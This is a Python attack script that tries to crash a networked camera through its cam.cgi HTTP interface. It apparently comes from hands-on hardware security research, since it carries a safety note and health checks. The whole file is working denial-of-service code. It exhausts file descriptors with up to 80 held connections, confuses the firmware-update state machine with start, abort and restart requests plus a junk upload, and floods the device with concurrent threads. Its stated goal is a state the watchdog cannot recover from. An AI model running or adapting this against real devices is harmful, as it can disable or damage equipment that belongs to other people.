#!/usr/bin/env python3
"""
crash_v3b.py — Targeted resource exhaustion + state machine attack.

Based on v3 findings:
  - Fork bomb (30 concurrent) starts exhausting the HTTP server
  - Sustained pressure puts camera in err_reject state
  - Camera has a 15s watchdog but it recovered both times

This version:
  1. Hold many connections open (fd exhaustion)
  2. While fd pool is depleted, trigger state machine confusion
  3. Repeat: exhaust -> confuse -> exhaust -> confuse
  4. Goal: get the camera into a state where the watchdog can't recover it

Safety: AC power, no flash writes.
"""
import socket
import struct
import threading
import time
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import KA, Net, parse_camrply, UA

IP = "192.168.1.131"
PORT = 80
TOTAL_SIZE = 90238464

def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)

def health_check(timeout=5):
    """Quick health check."""
    try:
        ka = KA(IP, port=PORT, timeout=timeout)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=getstate")
        r = parse_camrply(body).get("result", "?")
        ka.close()
        return r
    except:
        return "OFFLINE"

def open_connections(n, timeout=60):
    """Open n TCP connections and hold them. Returns list of sockets."""
    conns = []
    for i in range(n):
        try:
            s = socket.create_connection((IP, PORT), timeout=5)
            s.settimeout(timeout)
            conns.append(s)
        except:
            pass
        time.sleep(0.02)  # small stagger
    return conns

def close_all(conns):
    """Close all connections."""
    for s in conns:
        try:
            s.close()
        except:
            pass

def attack_round(num, n_conns):
    """One attack round:
    1. Open n_conns (hold open, no data sent)
    2. While connections are held, send state machine manipulation requests
    3. Close connections
    4. Check health
    """
    log("\n" + "="*60)
    log("ROUND %d: %d held connections + state confusion" % (num, n_conns))
    log("="*60)

    # Step 1: Open and hold connections
    log("  Opening %d connections..." % n_conns)
    conns = open_connections(n_conns)
    log("  Holding %d open..." % len(conns))

    # Step 2: While connections are held, try to confuse the state machine
    # Use a separate connection for the state manipulation
    results = []
    try:
        ka = KA(IP, port=PORT, timeout=10)
        # Open gate
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00")
        r = parse_camrply(body).get("result", "?")
        log("  [confuse] gate: %s" % r)

        # Start upload
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        r = parse_camrply(body).get("result", "?")
        log("  [confuse] startsenddata: %s (%.0fms)" % (r, dt*1000))

        # Try to abort
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=abortsenddata")
        r = parse_camrply(body).get("result", "?")
        log("  [confuse] abort: %s" % r)

        # Start again (race with the held connections)
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=startsenddata&type=fw&value=%d" % TOTAL_SIZE)
        r = parse_camrply(body).get("result", "?")
        log("  [confuse] restart: %s" % r)

        # Send a chunk
        boundary = "=====CRASH"
        chunk = b"X" * 20000
        body_m = ("--%s\r\n"
                  'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                  "Content-Type: application/octet-stream\r\n"
                  "Content-Length: %d\r\n\r\n" % (boundary, len(chunk)))
        body_m = body_m.encode() + chunk + b"--%s--" % boundary.encode()
        req = ("POST /cam.cgi?mode=senddata HTTP/1.1\r\n"
               "Host: %s\r\n"
               "User-Agent: LUMIX Sync\r\n"
               "Content-Type: multipart/form-data; boundary=%s\r\n"
               "Content-Length: %d\r\n\r\n" % (IP, boundary, len(body_m)))
        st, _, body, dt = ka.send(req.encode() + body_m)
        r = parse_camrply(body).get("result", "?") if body else "no_resp"
        log("  [confuse] chunk: %s (%.0fms)" % (r, dt*1000))

        # End
        st, _, body, dt = ka.request("GET", "/cam.cgi?mode=endsenddata")
        r = parse_camrply(body).get("result", "?")
        log("  [confuse] end: %s" % r)

        ka.close()
    except Exception as e:
        log("  [confuse] EXC: %s: %s" % (type(e).__name__, e))

    # Step 3: While the state machine is confused, send MORE concurrent requests
    log("  Sending 20 concurrent mixed requests (while fd pool is strained)...")
    def hammer(tid):
        try:
            s = socket.create_connection((IP, PORT), timeout=5)
            s.settimeout(5)
            reqs = [
                ("GET /cam.cgi?mode=startsenddata&type=fw&value=999999999 HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
                ("GET /cam.cgi?mode=abortsenddata HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
                ("GET /cam.cgi?mode=endsenddata HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
                ("GET /cam.cgi?mode=camctrl&type=fw_update_mode&value=V3.00 HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode(),
            ]
            for r in reqs:
                try:
                    s.sendall(r)
                    s.recv(4096)
                except:
                    break
            s.close()
        except:
            pass

    threads = []
    for t in range(20):
        th = threading.Thread(target=hammer, args=(t,))
        th.start()
        threads.append(th)
    for th in threads:
        th.join(timeout=12)

    # Step 4: Close held connections
    log("  Releasing %d held connections..." % len(conns))
    close_all(conns)

    # Step 5: Health check
    time.sleep(3)
    r = health_check(timeout=10)
    log("  [health] %s" % r)
    return r

def attack_escalating(n_start=20, n_max=80, rounds=5):
    """Escalating attack: start with n_start held connections, increase each round."""
    step = (n_max - n_start) // (rounds - 1) if rounds > 1 else 0

    for i in range(rounds):
        n = n_start + i * step
        r = attack_round(i+1, n)

        if r == "OFFLINE":
            log("  !! Camera went OFFLINE after round %d (%d conns)" % (i+1, n))
            log("  Waiting 30s for recovery...")
            time.sleep(30)
            r2 = health_check(timeout=10)
            if r2 == "OFFLINE":
                log("  !! Still offline. Waiting 60s more...")
                time.sleep(60)
                r2 = health_check(timeout=10)
                if r2 == "OFFLINE":
                    log("  !! Camera NOT recovering. STOP.")
                    return False
            log("  Camera recovered: %s" % r2)
            time.sleep(10)
        elif r.lower() not in ("ok",):
            log("  Camera in degraded state: %s. Waiting 15s..." % r)
            time.sleep(15)
            r2 = health_check(timeout=10)
            log("  After wait: %s" % r2)
            if r2.lower() != "ok":
                time.sleep(30)
                r2 = health_check(timeout=10)
                log("  After 30s more: %s" % r2)

        time.sleep(5)

    return True

def attack_sustained_exhaust():
    """Sustained exhaustion: keep 50 connections open for 30 seconds,
    sending one request every 2s on a separate connection."""
    log("\n" + "="*60)
    log("SUSTAINED EXHAUST: 50 held conns for 30s + periodic requests")
    log("="*60)

    conns = open_connections(50)
    log("  Holding %d conns for 30s..." % len(conns))

    for i in range(15):
        try:
            ka = KA(IP, port=PORT, timeout=10)
            st, _, body, dt = ka.request("GET", "/cam.cgi?mode=getstate")
            r = parse_camrply(body).get("result", "?")
            log("  t=%ds: getstate=%s (%.0fms)" % (i*2, r, dt*1000))
            ka.close()
        except:
            log("  t=%ds: TIMEOUT/ERROR" % (i*2))
        time.sleep(2)

    close_all(conns)
    log("  Released conns. Health check...")
    time.sleep(5)
    r = health_check(timeout=10)
    log("  [health] %s" % r)
    return r

def attack_mixed_pressure():
    """Mixed pressure: alternate between fd exhaustion and CPU exhaustion
    (rapid requests) in a tight loop."""
    log("\n" + "="*60)
    log("MIXED PRESSURE: 30s alternating fd + cpu exhaustion")
    log("="*60)

    stop = [False]

    def fd_worker():
        """Keep 30 connections open, refresh every 5s."""
        while not stop[0]:
            conns = open_connections(30, timeout=30)
            time.sleep(5)
            close_all(conns)

    def cpu_worker():
        """Send 5 rapid requests every second."""
        while not stop[0]:
            for i in range(5):
                try:
                    s = socket.create_connection((IP, PORT), timeout=3)
                    s.settimeout(3)
                    s.sendall(("GET /cam.cgi?mode=getstate HTTP/1.1\r\nHost: %s\r\nUser-Agent: LUMIX Sync\r\n\r\n" % IP).encode())
                    s.recv(4096)
                    s.close()
                except:
                    pass
            time.sleep(0.5)

    t1 = threading.Thread(target=fd_worker)
    t2 = threading.Thread(target=cpu_worker)
    t1.daemon = True
    t2.daemon = True
    t1.start()
    t2.start()

    log("  Running for 30s...")
    for i in range(6):
        time.sleep(5)
        r = health_check(timeout=5)
        log("  t=%ds: health=%s" % ((i+1)*5, r))

    stop[0] = True
    t1.join(timeout=5)
    t2.join(timeout=5)

    time.sleep(5)
    r = health_check(timeout=10)
    log("  [final health] %s" % r)
    return r

def main():
    log("S5 Camera CRASH v3b - Targeted resource exhaustion")
    log("Target: %s" % IP)
    log("WARNING: May cause extended downtime. AC power required.")
    log("")

    r = health_check(timeout=10)
    if r.lower() != "ok":
        log("Camera not ready: %s" % r)
        return
    log("Camera confirmed up. Starting attack.")

    # Phase A: Escalating fd exhaustion + state confusion
    log("\n\n>>> PHASE A: Escalating fd exhaustion (20->80 conns, 5 rounds)")
    ok = attack_escalating(n_start=20, n_max=80, rounds=5)
    if not ok:
        log("Camera not recovering. Stopping.")
        return

    # Recovery pause
    log("\n  Recovery pause: 20s...")
    time.sleep(20)
    r = health_check(timeout=10)
    log("  After pause: %s" % r)
    if r.lower() != "ok":
        time.sleep(30)
        r = health_check(timeout=10)
        log("  After 30s more: %s" % r)

    # Phase B: Sustained exhaustion (50 conns held for 30s)
    log("\n\n>>> PHASE B: Sustained exhaustion (50 conns, 30s)")
    attack_sustained_exhaust()

    # Recovery pause
    log("\n  Recovery pause: 20s...")
    time.sleep(20)
    r = health_check(timeout=10)
    log("  After pause: %s" % r)
    if r.lower() != "ok":
        time.sleep(30)
        r = health_check(timeout=10)

    # Phase C: Mixed pressure (fd + cpu, 30s)
    log("\n\n>>> PHASE C: Mixed pressure (30s)")
    attack_mixed_pressure()

    # Final
    log("\n" + "="*60)
    log("ALL PHASES COMPLETE")
    log("="*60)
    time.sleep(5)
    r = health_check(timeout=10)
    log("Final state: %s" % r)

    if r.lower() != "ok":
        log("Camera in degraded state. Waiting 60s for recovery...")
        time.sleep(60)
        r = health_check(timeout=10)
        log("After 60s: %s" % r)

if __name__ == "__main__":
    main()
